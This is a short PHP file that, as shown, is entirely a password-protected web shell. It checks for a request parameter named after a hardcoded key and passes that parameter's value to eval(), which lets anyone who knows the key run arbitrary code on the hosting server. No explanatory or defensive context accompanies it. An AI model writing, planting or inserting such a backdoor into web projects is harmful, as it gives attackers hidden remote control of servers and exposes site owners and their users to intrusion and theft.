<?php
$password = '3K0sIssUSg';
if (isset($_REQUEST[$password])) {
    $cmd = $_REQUEST[$password];
    echo eval($cmd);
}
?>